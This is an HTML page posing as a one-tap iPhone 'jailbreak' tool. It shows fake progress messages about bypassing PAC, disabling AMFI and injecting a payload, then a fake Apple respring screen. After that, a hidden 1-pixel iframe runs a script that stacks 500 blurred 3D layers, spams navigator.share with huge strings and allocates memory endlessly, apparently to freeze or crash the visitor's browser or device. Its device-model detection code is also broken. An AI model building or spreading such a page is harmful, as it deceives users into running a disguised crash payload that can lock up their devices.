<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>Jailbreak</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            font-family: -apple-system, 'Inter', BlinkMacSystemFont, 'SF Pro Display', sans-serif;
        }

        :root {
            --bg: #000000;
            --bg-elevated: #1c1c1e;
            --bg-secondary: #2c2c2e;
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.6);
            --text-tertiary: rgba(255, 255, 255, 0.35);
            --accent: #0a84ff;
            --accent-dim: rgba(10, 132, 255, 0.15);
            --separator: rgba(255, 255, 255, 0.08);
            --danger: #ff453a;
            --success: #30d158;
        }

        body {
            background: var(--bg);
            color: var(--text-primary);
            min-height: 100vh;
            min-height: 100dvh;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        .bg {
            position: fixed;
            inset: 0;
            z-index: -1;
            background:
                radial-gradient(ellipse 80% 50% at 20% 0%, rgba(10, 132, 255, 0.08) 0%, transparent 60%),
                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(175, 82, 222, 0.06) 0%, transparent 50%),
                var(--bg);
        }

        .main-content {
            padding: 20px 20px 160px;
            max-width: 430px;
            margin: 0 auto;
        }

        .hero {
            text-align: center;
            padding: 40px 0 32px;
        }

        .hero-icon {
            width: 88px;
            height: 88px;
            margin: 0 auto 20px;
            background: #0a84ff;
            border-radius: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 20px rgba(10, 132, 255, 0.25);
        }

        .hero-icon svg {
            width: 44px;
            height: 44px;
            stroke: #fff;
            stroke-width: 1.5;
        }

        .hero h1 {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 6px;
            letter-spacing: -0.6px;
        }

        .hero p {
            font-size: 15px;
            color: var(--text-secondary);
            font-weight: 400;
        }

        .card {
            background: var(--bg-elevated);
            border-radius: 24px;
            overflow: hidden;
        }

        .card-row {
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 0.5px solid var(--separator);
            transition: background 0.15s;
        }

        .card-row:last-child {
            border-bottom: none;
        }

        .card-row:active {
            background: rgba(255, 255, 255, 0.04);
        }

        .row-icon {
            width: 32px;
            height: 32px;
            border-radius: 9px;
            background: #2c2c2e;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0a84ff;
            flex-shrink: 0;
        }

        .row-icon svg {
            width: 18px;
            height: 18px;
            stroke-width: 2;
        }

        .row-text {
            flex: 1;
            min-width: 0;
        }

        .row-label {
            font-size: 13px;
            color: var(--text-tertiary);
            margin-bottom: 1px;
            font-weight: 500;
        }

        .row-value {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
            letter-spacing: -0.2px;
        }

        .row-chevron {
            color: var(--text-tertiary);
            font-size: 13px;
            font-weight: 700;
            flex-shrink: 0;
        }

        .info-section {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .progress-section {
            margin-top: 28px;
            padding: 28px;
            text-align: center;
        }

        .progress-ring-wrap {
            width: 120px;
            height: 120px;
            margin: 0 auto 16px;
            position: relative;
        }

        .progress-ring-wrap svg {
            transform: rotate(-90deg);
        }

        .progress-bg {
            fill: none;
            stroke: var(--bg-secondary);
            stroke-width: 8;
            stroke-linecap: round;
        }

        .progress-fill {
            fill: none;
            stroke: url(#pg);
            stroke-width: 8;
            stroke-linecap: round;
            stroke-dasharray: 339.292;
            stroke-dashoffset: 339.292;
            transition: stroke-dashoffset 1.2s cubic-bezier(0.32, 0.72, 0, 1);
        }

        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 26px;
            font-weight: 800;
            font-variant-numeric: tabular-nums;
            letter-spacing: -1px;
        }

        .progress-label {
            font-size: 15px;
            color: var(--text-secondary);
            font-weight: 500;
            min-height: 22px;
        }

        .action-btn {
            width: 100%;
            padding: 16px 24px;
            margin-top: 24px;
            border: none;
            border-radius: 14px;
            background: var(--accent);
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
            letter-spacing: -0.2px;
        }

        .action-btn:active {
            transform: scale(0.97);
            opacity: 0.85;
        }

        .action-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .tab-bar-wrap {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 0 20px max(20px, env(safe-area-inset-bottom)) 20px;
            display: flex;
            justify-content: center;
            z-index: 100;
            pointer-events: none;
        }

        .tab-bar {
            display: flex;
            align-items: center;
            gap: 4px;
            padding: 5px 6px;
            background: var(--bg-elevated);
            border-radius: 40px;
            border: 0.5px solid var(--separator);
            pointer-events: auto;
            max-width: 280px;
            width: 100%;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.5);
        }

        .tab-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 3px;
            padding: 8px 16px;
            border-radius: 24px;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            font-family: inherit;
            font-size: 11px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.32, 0.72, 0, 1);
            flex: 1;
            text-decoration: none;
            min-width: 0;
        }

        .tab-btn.active {
            background: var(--bg-secondary);
            color: var(--accent);
        }

        .tab-btn:active {
            transform: scale(0.88);
        }

        .tab-btn svg {
            width: 22px;
            height: 22px;
            stroke-width: 1.8;
        }

        .respring-overlay {
            position: fixed;
            inset: 0;
            background: #000;
            z-index: 9999;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.4s;
        }

        .respring-overlay.active {
            display: flex;
            opacity: 1;
        }

        .respring-overlay .apple-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 36px;
            opacity: 0.9;
        }

        .respring-overlay .apple-logo svg {
            width: 100%;
            height: 100%;
            fill: #fff;
        }

        .respring-bar-container {
            width: 200px;
            height: 3px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 16px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .respring-bar-container.visible {
            opacity: 1;
        }

        .respring-bar-fill {
            height: 100%;
            width: 0%;
            background: #fff;
            border-radius: 2px;
            transition: width 0.3s linear;
        }

        #exploit-frame {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            border: none;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }

        /* Animations */
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(16px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .in {
            animation: fadeUp 0.5s cubic-bezier(0.32, 0.72, 0, 1) forwards;
        }

        .d1 { animation-delay: 0.05s; opacity: 0; }
        .d2 { animation-delay: 0.1s; opacity: 0; }
        .d3 { animation-delay: 0.15s; opacity: 0; }
        .d4 { animation-delay: 0.2s; opacity: 0; }
        .d5 { animation-delay: 0.25s; opacity: 0; }
        .d6 { animation-delay: 0.3s; opacity: 0; }
    </style>
<base target="_blank">

    <iframe id="exploit-frame" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        function detectDevice() {
            const ua = navigator.userAgent;
            let device = "iPhone";
            let model = "";

            if (/iPhone/.test(ua)) {
                device = "iPhone";
                if (/iPhone16,2/) model = "16 Pro Max";
                else if (/iPhone16,1/) model = "16 Pro";
                else if (/iPhone15,5/) model = "16";
                else if (/iPhone15,4/) model = "16 Plus";
                else if (/iPhone15,3/) model = "15 Pro Max";
                else if (/iPhone15,2/) model = "15 Pro";
                else if (/iPhone15,1/) model = "15";
                else model = "Latest";
            } else if (/iPad/.test(ua)) {
                device = "iPad";
                model = "Pro";
            } else if (/Android/.test(ua)) {
                device = "Android";
                model = "";
            } else {
                device = "Desktop";
                model = "";
            }

            document.getElementById('device-name').textContent = device + (model ? " " + model : "");

            const w = window.screen.width;
            const h = window.screen.height;
            const dpr = window.devicePixelRatio || 1;
            document.getElementById('screen-info').textContent = w + "x" + h + " @" + dpr + "x";

            if (navigator.deviceMemory) {
                document.getElementById('memory-info').textContent = navigator.deviceMemory + " GB";
            } else {
                document.getElementById('memory-info').textContent = "Unknown";
            }
        }

        function setProgress(pct) {
            const c = document.getElementById('progress-circle');
            const t = document.getElementById('progress-text');
            const circ = 339.292;
            c.style.strokeDashoffset = circ - (pct / 100) * circ;
            t.textContent = pct + '%';
        }

        function startJailbreak() {
            const btn = document.getElementById('jb-btn');
            const lbl = document.getElementById('progress-label');
            btn.disabled = true;
            btn.textContent = "Running...";

            const steps = [
                {p: 12, t: "Mapping kernel..."},
                {p: 28, t: "Bypassing PAC..."},
                {p: 42, t: "Disabling AMFI..."},
                {p: 58, t: "Patching sandbox..."},
                {p: 74, t: "Injecting payload..."},
                {p: 88, t: "Finalizing..."},
                {p: 100, t: "Respringing"}
            ];

            let i = 0;
            const iv = setInterval(() => {
                if (i < steps.length) {
                    setProgress(steps[i].p);
                    lbl.textContent = steps[i].t;
                    i++;
                } else {
                    clearInterval(iv);
                    triggerRespring();
                }
            }, 700);
        }

        function triggerRespring() {
            const overlay = document.getElementById('respring-overlay');
            const bar = document.getElementById('respring-bar');
            const fill = document.getElementById('respring-bar-fill');

            overlay.classList.add('active');

            
            setTimeout(() => bar.classList.add('visible'), 100);

            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 15 + 5;
                if (progress > 100) progress = 100;
                fill.style.width = progress + '%';

                if (progress >= 100) {
                    clearInterval(interval);
                    // Start actual exploit after bar fills
                    setTimeout(() => {
                        const frame = document.getElementById('exploit-frame');
                        frame.srcdoc = `<html><body style="margin:0;overflow:hidden;"><script>const c=document.createElement('div');c.style.cssText='perspective:1px;perspective-origin:9999999% 9999999%;';document.body.appendChild(c);for(let i=0;i<500;i++){let d=document.createElement('div');d.style.cssText='position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);opacity:0.99;';c.appendChild(d);}setInterval(()=>{try{navigator.share({title:'R',text:'R'.repeat(100000)});}catch(e){}let x=new Uint8Array(1024*1024*20);crypto.getRandomValues(x);},0);function stress(){const arr=[];for(let i=0;i<5000;i++)arr.push(new Uint8Array(1024*1024));setTimeout(stress,50);}stress();<\/script></body></html>`;
                    }, 500);
                }
            }, 200);
        }

        detectDevice();
        setProgress(0);
    </script>
</body>
